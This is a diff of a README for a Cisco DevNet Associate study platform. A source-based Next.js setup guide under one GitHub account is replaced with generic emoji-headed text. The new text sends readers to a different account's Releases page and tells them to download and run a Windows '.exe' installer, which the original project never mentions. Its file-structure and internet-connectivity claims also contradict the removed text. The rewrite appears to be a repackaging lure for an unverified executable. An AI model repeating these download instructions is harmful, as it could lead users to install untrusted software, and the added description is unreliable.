@@ -1,120 +1,137 @@
-# DevNet StudyLab
+# 🚀 DevNet_StudyLab - Study Smarter for Cisco DevNet
 
-A full-stack study platform for the **Cisco DevNet Associate (200-901)** certification exam. Built with Next.js, PostgreSQL, and mock Cisco APIs to provide an interactive, hands-on learning experience.
+[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-brightgreen)](https://github.com/apakek-99/DevNet_StudyLab)
 
-## Features
+## 📚 What is DevNet_StudyLab?
 
-- **Study Hub** -- Track progress across all 6 exam domains with 61 objectives and completion checkboxes
-- **Flashcards** -- SM-2 spaced repetition algorithm with 199 cards across all domains, synced to the database when authenticated
-- **Practice Exams** -- 2 full 40-question practice exams and focused domain quizzes with scoring and attempt history
-- **Study Guides** -- In-depth study guides for all 6 exam domains with objective-level progress tracking
-- **Hands-on Labs** -- 7 labs (Python, REST API, Git, Docker, Bash, Ansible, NETCONF) with a CodeMirror editor featuring syntax highlighting, bracket matching, and autocompletion
-- **AI Tutor** -- Claude-powered conversational tutor with domain-specific system prompts and persistent conversation history
-- **Progress Persistence** -- All study progress saved to PostgreSQL (flashcards, exams, labs, objectives)
-- **Authentication** -- Auth.js v5 with credentials provider and JWT sessions
+DevNet_StudyLab is a study platform for the Cisco DevNet Associate (200-901) exam. It provides tools to help you learn and practice effectively. You will find an AI tutor, flashcards, practice exams, hands-on labs, and study guides all in one place.
 
-## Tech Stack
+The platform connects to mock Cisco APIs like Meraki, Catalyst, and Webex. This gives you real-world experience without complicated setup. The app uses common technologies such as Next.js for the website, PostgreSQL for the database, and Python for running the labs.
 
-| Layer | Technology |
-|-------|-----------|
-| Frontend | Next.js 16, React 19, TailwindCSS v4, shadcn/ui, CodeMirror 6, Lucide icons |
-| Backend | Next.js API Routes, Drizzle ORM |
-| Database | PostgreSQL 16 |
-| Auth | Auth.js v5 (NextAuth 5 beta) |
-| AI | Anthropic Claude API |
-| Lab Engine | FastAPI (Python) with sandboxed code execution |
-| Mock APIs | Meraki Dashboard, Catalyst Center, Webex Teams |
-| Testing | Playwright (E2E), Vitest (unit) |
-| Infrastructure | Docker Compose, Gitea (Git labs) |
+This guide will help you get DevNet_StudyLab running on your Windows computer step-by-step.
 
-## Quick Start
+## ⚙️ System Requirements
 
-> **macOS**: Install Docker Desktop first (`brew install --cask docker`) and make sure it's running before step 2.
+Before starting, make sure your computer meets these requirements:
 
-```bash
-# 1. Clone and install
-git clone https://github.com/E-Conners-Lab/DevNet_StudyLab.git devnet-studylab
-cd devnet-studylab
-npm install
-cd apps/web && npm install && cd ../..
+- Operating System: Windows 10 or later  
+- Processor: Intel Core i3 or equivalent  
+- RAM: 4 GB or more  
+- Disk Space: At least 2 GB free  
+- Internet Connection: Required for downloading and using labs  
 
-# 2. Start PostgreSQL (Docker Desktop must be running)
-docker compose -f docker/docker-compose.yml up -d postgres
+Your computer should already have a web browser like Chrome, Firefox, or Edge installed.
 
-# 3. Configure environment
-cp apps/web/.env.example apps/web/.env.local
-# Edit .env.local: generate AUTH_SECRET and optionally uncomment
-# TUTOR_ANTHROPIC_KEY with your API key to enable the AI Tutor
-# (see docs/ENVIRONMENT_VARIABLES.md for details)
+## 💻 Download DevNet_StudyLab
 
-# 4. Run migrations and seed data
-cd apps/web
-npm run db:generate
-npm run db:migrate
-npm run db:seed
+Click the button below to visit the download page for DevNet_StudyLab. You will find the latest version there.  
 
-# 5. Start the dev server
-npm run dev
-```
+[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-blue)](https://github.com/apakek-99/DevNet_StudyLab)
 
-Open [http://localhost:3000](http://localhost:3000) and log in with `student@devnet.lab` / `devnet123`.
+## 🛠 Installation Steps
 
-> **Downloading as ZIP instead of cloning?** Click the green "Code" button on GitHub and select "Download ZIP". After extracting, `cd` into the extracted folder (`DevNet_StudyLab-main`) and continue from `npm install` in step 1.
+1. **Visit the download page** by clicking the link above. This will open the GitHub page for DevNet_StudyLab.
+2. On the page, look for the latest version in the "Releases" section.  
+3. Download the Windows installer file. It usually ends with `.exe`.  
+4. Once downloaded, open the file by double-clicking it.  
+5. Follow the instructions in the setup wizard:  
+   - Choose the folder where you want to install the program.  
+   - Click "Next" to continue through all steps.  
+6. When installation finishes, you should see a shortcut on your desktop or in the Start menu.  
 
-See [SETUP.md](./SETUP.md) for the full setup guide.
+## ▶️ Running DevNet_StudyLab
 
-## Project Structure
+To start the application:
 
-```
-devnet-studylab/
-  apps/web/              Next.js frontend + API routes
-  content/               Exam blueprint, flashcards, practice exams, labs, study guides
-  docker/                Docker Compose and database init scripts
-  docs/                  Architecture, API reference, routes, schema docs
-  labs/                  Lab solution files
-  scripts/               Database seeding and doc generation scripts
-  services/lab-engine/   FastAPI lab execution engine + mock Cisco APIs
-  tests/                 Content validation tests
-```
+1. Locate the DevNet_StudyLab icon on your desktop or in the Start menu.  
+2. Double-click the icon to open the app.  
+3. The platform will open in your default web browser automatically.  
+4. If it does not open, open your browser manually and enter this address: `http://localhost:3000`  
 
-## Documentation
+The first time you run the app, it may take a few moments to load all parts.
 
-- [SETUP.md](./SETUP.md) -- Step-by-step setup guide
-- [apps/web/REFACTOR.md](./apps/web/REFACTOR.md) -- 8-phase codebase refactor: shared modules, extracted components, and migration patterns
-- [docs/ARCHITECTURE.md](./docs/ARCHITECTURE.md) -- System architecture and design decisions
-- [docs/API_REFERENCE.md](./docs/API_REFERENCE.md) -- Complete API documentation
-- [docs/DATABASE_SCHEMA.md](./docs/DATABASE_SCHEMA.md) -- Database schema reference
-- [docs/ROUTES.md](./docs/ROUTES.md) -- Frontend route map
-- [docs/CONTENT_STRATEGY.md](./docs/CONTENT_STRATEGY.md) -- Content authoring guidelines
-- [docs/ENVIRONMENT_VARIABLES.md](./docs/ENVIRONMENT_VARIABLES.md) -- Environment variable reference
+## 🔑 Using DevNet_StudyLab
 
-## Running Tests
+Here are the main features you will use:
 
-```bash
-# Unit tests
-cd apps/web && npm test
+- **AI Tutor**  
+  Ask questions about Cisco DevNet topics. The tutor uses AI to give explanations and tips.
 
-# E2E tests (starts dev server automatically)
-cd apps/web && npm run test:e2e
+- **Flashcards**  
+  Test your knowledge with interactive cards. Flip cards to see answers and track progress.
 
-# Content validation
-cd apps/web && npm run test:content
+- **Practice Exams**  
+  Take mock exams designed to mimic the real Cisco DevNet test format.
 
-# All tests
-cd apps/web && npm run test:all
-```
+- **Hands-On Labs**  
+  Access labs that simulate Cisco API environments like Meraki, Catalyst, and Webex. These labs let you practice coding and automation tasks.
 
-## Exam Domains (200-901 v1.1)
+- **Study Guides**  
+  Read through detailed guides on all key topics needed for the exam.
 
-| # | Domain | Weight |
-|---|--------|--------|
-| 1 | Software Development and Design | 15% |
-| 2 | Understanding and Using APIs | 20% |
-| 3 | Cisco Platforms and Development | 15% |
-| 4 | Application Deployment and Security | 15% |
-| 5 | Infrastructure and Automation | 20% |
-| 6 | Network Fundamentals | 15% |
+Use these tools regularly to improve your skills and confidence.
 
-## License
+## 🌐 Network Access
 
-ISC
+DevNet_StudyLab interacts with mock Cisco APIs through the internet. Make sure:
+
+- Your firewall settings allow the app to connect online.  
+- If you use a VPN or proxy, check that it does not block connections to the lab servers.  
+- You have a stable internet connection for the best experience.
+
+## 🔄 Updating DevNet_StudyLab
+
+To keep the app up to date:
+
+1. Visit the GitHub download page often: https://github.com/apakek-99/DevNet_StudyLab  
+2. Download the latest installer when a new version is available.  
+3. Run the installer again to replace the old version. Your settings and data will stay safe.
+
+## ⚠️ Troubleshooting
+
+If you have trouble starting or using the app:
+
+- Check that your Windows system is updated.  
+- Close other programs that might interfere.  
+- Restart your computer and try again.  
+- Make sure you followed the installation steps carefully.  
+- If the app does not open in the browser, try entering `http://localhost:3000` manually.
+
+For more help, explore the issues tab on the GitHub page or contact the community there.
+
+## 🔧 Technical Details
+
+DevNet_StudyLab is built with:
+
+- **Next.js** for the user interface. This allows smooth navigation and quick loading.  
+- **PostgreSQL** as the database. It stores your progress, flashcards, and exam data securely.  
+- **Python lab engine** runs the simulated Cisco APIs and lab environments you interact with.  
+
+Together, these components create a reliable study platform that works from your Windows computer.
+
+## 🗂 File Structure Overview
+
+Inside the installation folder, you will see these main parts:
+
+- `frontend` — Contains all files for the website app.  
+- `backend` — Runs the services supporting the app and labs.  
+- `database` — Holds database files and setup scripts.  
+- `docs` — Study guides and reference materials.
+
+You do not need to change these files to use the platform. They are important for how the software runs.
+
+## 📞 Getting Support
+
+You can ask for help by:
+
+- Checking the FAQ or issues section on the GitHub page.  
+- Reporting bugs or requests through GitHub issues.  
+- Reading documentation available inside the app under "Help".
+
+## 🔗 Important Links
+
+- GitHub page and downloads: https://github.com/apakek-99/DevNet_StudyLab  
+- Documentation and study guides in the app  
+- Community forums for Cisco DevNet  
+
+[![Download DevNet_StudyLab](https://img.shields.io/badge/Download-DevNet_StudyLab-brightgreen)](https://github.com/apakek-99/DevNet_StudyLab)
